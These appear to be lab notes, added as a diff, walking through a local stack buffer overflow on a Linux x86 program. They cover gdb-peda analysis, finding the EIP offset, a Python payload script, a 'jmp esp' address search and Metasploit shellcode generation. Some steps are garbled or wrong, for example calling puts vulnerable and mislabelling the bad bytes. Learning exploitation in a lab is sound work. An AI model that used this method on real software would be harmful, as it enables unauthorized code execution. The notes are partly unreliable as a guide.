@@ -1,0 +1,118 @@
+Login to Linux
+Step by step (for Linux)
+1. static analysis: file, strings, etc.
+2. Behavioral analysis: Run the program. Give it input. Give it lots of input to see if we can
+get a segmentation fault.
+1. Segmentation fault = we can do a buffer overflow
+3. Disassembly with gdb-peda
+1. <gdb> <enter> (func is the file name)
+2. <disass> *anywhere we see "call:, its reaching out to some function
+1. this will disassemble main() and show us functions within the program.
+2. we can look into called functions to find additional functions
+1. To look at a function, <disass> which is a function that was listed in
+the "call"
+2. ***If you see [gets] & [puts] functions, these are known
+vulnerabilities to buffer overflow.
+3. Google "vulnerable function [function name]" to see if there are
+known vulnerabilities, such as with "gets" and "puts".
+4. If you have gdb-peda installed, <pdisass> (or <pdisass> etc)
+1. It will highlight functions; green means probably ok, red
+means vulnerable. A green function can contain a red
+subfunction, so check your green functions as well.
+2. Run the program & crash it by entering <r>
+3. Provide in put until we get segmentation fault (just so many
+AAAAAAAAAAA's)
+4. In the registers info, our EIP should just have 0x41414141
+('AAAA')This means I can overwrite the EIP
+5. It crashes because 0x41414141 is NOT a valid address for
+the next instruction.
+6. If we can overwrite EIP, we can direct it where to go to
+execute code.
+3. "fuzz" the inputs to determine the offset (how many "A's" it takes to reach the
+EIP)
+1. Navigate to <https:>
+1. Copy/ paste the pattern given
+2. Generate a "random" long enough to overflow the buffer
+3. Run the program <r>
+1. Paste in the random string from wiremask <enter>
+2. Check the EIP register and copy the hex value into the pattern￾generator website. It will then tell you the offset.
+3. The offset is how many "A's" we need to get to the EIP
+4. Now begins the python coding…
+5. Buffer variable is the number of "A's" needed to reach the EIP
+register (the offset)
+6. EIP variable is what we want to write to the EIP.
+7. We put four B's so we can make sure we landed exactly on target
+8. The C's in buf are to make sure we got it right
+9. When it crashes, our EIP should be BBBB. If there is an A, our
+offset is too long. If there is a C, our offset is too short.
+4. (localflow.py)
+#!/usr/bin/python
+buffer='\x41' * 62 #<bufferoffset>
+EIP='\x42' * 4
+buf='\x43' * 10
+print(buffer+EIP+buf)
+5. Then we combine it all and run it.
+1. r <<< $(python localflow.py)
+2. Our EIP is now BBBB, time for the next step
+3. Quit gdb-peda <quit>
+6. Find a good value for EIP
+1. env - gdb [file]
+2. unset env LINES
+3. unset env COLUMNS
+4. show env
+5. Should get no results. This means we have successfully unset the
+environment variables.
+6. Then run it and crash it by any means.
+7. <r>
+8. and a bunch of AAAAA's until we get a segmentation fault
+9. Now that the programs has run and faulted and dumped, we're going to
+need a map to find our way through this process.
+10. <info> shows us start address, end address, etc.
+11. Copy out the first address after the heap and the last address before
+the stack. We want to search the pace between the stack and the heap
+12.
+13.
+1. First after heap: 0xf7de1000
+2. Last before stack: 0xf7ffe000
+3. We want to search between the stack and the heap for a 'jmp esp'
+command so we can point our EIP to the top of the stack. Find
+bytes (/b) between the start of the HEAP and the start of the
+STACK, looking for jmp (0xff) esp (0xe4).
+4. <find>
+1. It should return a bunch of memory addresses. Grab 3-5 of
+them (top is preferable). We only need one, but in case that
+one doesn't work, we can try another.
+1. 0xf7de3b59
+2. 0xf7f588ab
+3. 0xf7f645fb
+4. 0xf7f6460f
+5. 0xf7f64aeb
+2. Code: (go to "localflow.py" and comment out first script to
+add the below) This allows you to have just one file, and
+comment out the scripts you're not currently using.
+3. To <readelf>
+buffer = '\x41' * 62 #62=buffer offset
+EIP = '\x59\x3b\xde\xf7' #reverse bytes b/c little endian, the
+highlighted are the addresses from above. If the five selecte were
+(0xf7df1b51, 0xf7f6674b, 0xf7f72753, 0xf7f72c6b, 0xf7f72df7) then
+you would enter '\x51\x1b\xdf\xf7'
+#add some nops for safety
+nop = '\x90' * 15
+5. AND NOW FOR OUR SHELL CODE…
+1. In another window, run (leave gdb window open):
+1. <msfconsole> then
+2. <use> (If trying to gain command execution on an x86
+linux system)
+3. <show> (see what we can do)
+4. <set> #i.e., <whoami>
+5. <show> (make sure everything looks good)
+2. Now generate the shell code (in linux/x86/exec window)
+1. (-b) removes bad bytes. Newline (x0a), end of file
+(x00), and null (x03), output for python code.
+2. <generate>
+3. #Copy all the output for shell code and also settings
+evaluation if it fails
+4. Paste all of this into your original script (localflow.py)
+just above our print statement.
+6. Run this script in your LINOPS box:
+sudo ./func <<< $(python localflow.py)
